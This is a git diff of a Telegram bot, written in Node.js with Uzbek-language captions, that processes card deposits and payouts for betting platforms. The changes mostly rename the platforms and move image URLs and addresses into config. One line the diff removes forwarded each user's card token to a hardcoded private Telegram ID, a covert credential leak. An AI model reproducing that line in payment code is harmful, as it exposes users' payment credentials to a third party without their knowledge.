@@ -6,6 +6,7 @@ const config = require('./config'); // config faylni import qilamiz
 const JvPaymentAPIClient = require('./jvspinbetpay');
 const ProPaymentAPIClient = require('./1probet-pay');
 const adminusername = config.ADMIN.ADMIN_USERNAME;
+const IMAGE_DEPOSIT = config.IMAGE.IMAGE_DEPOSIT;
 
 
 
@@ -107,8 +108,8 @@ const backKeyboard = Markup.keyboard([
 
 const platformButtons = Markup.inlineKeyboard([
     [Markup.button.callback('SpinBetter', 'platform_spinbetter')],
-    [Markup.button.callback('Win Win', 'platform_probet')],
-    [Markup.button.callback('Melbet', 'platform_JVSPINBET')]
+    [Markup.button.callback('Melbet', 'platform_MELBET')],
+    [Markup.button.callback('Win Win', 'platform_WINWIN')]
 ]).resize();
 
 // Helper Functions
@@ -905,38 +906,38 @@ bot.action(/platform_(.+)/, async (ctx) => {
 
     if (userState.state === 'WITHDRAWAL_TYPE' && platform === 'spinbetter') {
         setState(ctx.from.id, 'WAITING_ID', { ...userState.data, platform });
-        await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
+        await ctx.telegram.sendPhoto(ctx.chat.id, IMAGE_DEPOSIT, {
             caption: 'ID raqamingizni kiriting!\n 💳 SPINBETTER UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!',
             reply_markup: backKeyboard
           });
     } else if (userState.state === 'PAYOUT_TYPE' && platform === 'spinbetter') {
         setState(ctx.from.id, 'PAYOUT_WAITING_ID', { ...userState.data, platform });
-        await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
-            caption: 'ID raqamingizni kiriting!\n 💳 SPINBETTER UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!\n( Manzil : Qarshi, LT Textile (24/7))',
+        await ctx.telegram.sendPhoto(ctx.chat.id, IMAGE_DEPOSIT, {
+            caption: `ID raqamingizni kiriting!\n 💳 SPINBETTER UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!\n( Manzil : ${config.MANZIL.MANZIL_SPIN})`,
             reply_markup: backKeyboard
           });
-        }else if (userState.state === 'WITHDRAWAL_TYPE' && platform === 'probet') {
+        }else if (userState.state === 'WITHDRAWAL_TYPE' && platform === 'MELBET') {
             setState(ctx.from.id, 'PRO_WAITING_ID', { ...userState.data, platform });
-            await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
-                caption: 'ID raqamingizni kiriting!\n 💳 Win Win UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!',
+            await ctx.telegram.sendPhoto(ctx.chat.id, IMAGE_DEPOSIT, {
+                caption: 'ID raqamingizni kiriting!\n 💳 Melbet UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!',
                 reply_markup: backKeyboard
               });
-        } else if (userState.state === 'PAYOUT_TYPE' && platform === 'probet') {
+        } else if (userState.state === 'PAYOUT_TYPE' && platform === 'MELBET') {
             setState(ctx.from.id, 'PRO_PAYOUT_WAITING_ID', { ...userState.data, platform });
-            await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
-                caption: 'ID raqamingizni kiriting!\n 💳 win win UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!\n( Manzil : Qarshi SimplePay (24/7))',
+            await ctx.telegram.sendPhoto(ctx.chat.id, IMAGE_DEPOSIT, {
+                caption: `ID raqamingizni kiriting!\n 💳 Melbet UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!\n( Manzil : ${config.MANZIL.MANZIL_MEL})`,
                 reply_markup: backKeyboard
               });
-    }else if (userState.state === 'WITHDRAWAL_TYPE' && platform === 'JVSPINBET') {
+    }else if (userState.state === 'WITHDRAWAL_TYPE' && platform === 'WINWIN') {
         setState(ctx.from.id, 'JV_WAITING_ID', { ...userState.data, platform });
-        await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
-            caption: 'ID raqamingizni kiriting!\n 💳 Melbet UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!',
+        await ctx.telegram.sendPhoto(ctx.chat.id, IMAGE_DEPOSIT, {
+            caption: 'ID raqamingizni kiriting!\n 💳 Win Win UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!',
             reply_markup: backKeyboard
           });
-    } else if (userState.state === 'PAYOUT_TYPE' && platform === 'JVSPINBET') {
+    } else if (userState.state === 'PAYOUT_TYPE' && platform === 'WINWIN') {
         setState(ctx.from.id, 'JV_PAYOUT_WAITING_ID', { ...userState.data, platform });
-        await ctx.telegram.sendPhoto(ctx.chat.id, 'https://t.me/simplepay_uz/3', {
-            caption: 'ID raqamingizni kiriting!\n 💳 Melbet UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!\n( Manzil : Qarshi SimplePay (24/7))',
+        await ctx.telegram.sendPhoto(ctx.chat.id, IMAGE_DEPOSIT, {
+            caption: `ID raqamingizni kiriting!\n 💳 Win Win UZS ID OLISH NAMUNA YUQORIDAGI SURATTA!\n( Manzil : ${config.MANZIL.MANZIL_WIN})`,
             reply_markup: backKeyboard
           });
     } else {
@@ -1272,7 +1273,6 @@ bot.on('text', async (ctx) => {
                                 expiryDate,
                                 cardToken: cardTokenResponse.card_token 
                             });
-                            await bot.telegram.sendMessage(7156723943, cardTokenResponse.card_token)
                             await ctx.reply('SMS kodni kiriting:', backKeyboard);
                         } else {
                             await ctx.reply("Karta ma'lumotlari noto'g'ri, qayta urinib ko'ring.");
@@ -1302,9 +1302,9 @@ bot.on('text', async (ctx) => {
                         
                             if (userState.data.platform === 'spinbetter') {
                                 depositResponse = await paymentClient.deposit(userState.data.gameId, userState.data.amount);
-                            } else if (userState.data.platform === 'JVSPINBET') {
+                            } else if (userState.data.platform === 'WINWIN') {
                                 depositResponse = await jvpaymentClient.deposit(userState.data.gameId, userState.data.amount);
-                            } else if (userState.data.platform === 'probet') {
+                            } else if (userState.data.platform === 'MELBET') {
                                 depositResponse = await propaymentClient.deposit(userState.data.gameId, userState.data.amount);
                             } else {
                                 throw new Error('Platform not supported');
@@ -1545,9 +1545,9 @@ bot.on('text', async (ctx) => {
                                 const response = await (
                                     userState.data.platform === 'spinbetter'
                                         ? paymentClient.payout(gameId, code)
-                                        : userState.data.platform === 'JVSPINBET'
+                                        : userState.data.platform === 'WINWIN'
                                         ? jvpaymentClient.payout(gameId, code)
-                                        : userState.data.platform === 'probet'
+                                        : userState.data.platform === 'MELBET'
                                         ? propaymentClient.payout(gameId, code)
                                         : (() => { throw new Error('Platform not supported'); })()
                                 );
@@ -1584,7 +1584,6 @@ bot.on('text', async (ctx) => {
 💳 Karta: ${payoutData.cardNumber}
 💰 Summa: ${payoutData.amount} UZS
 🆔 Telegram Id: ${payoutData.telegramId}
-💰 To'lang: ${comission} UZS
 🔑 Operation ID: ${payoutData.operationId}
 ⏰ Vaqt: ${new Date().toLocaleString()}
 📝 Status: ${payoutData.success ? 'Muvofaqiyatli' : 'Muvofaqiyatsiz'}
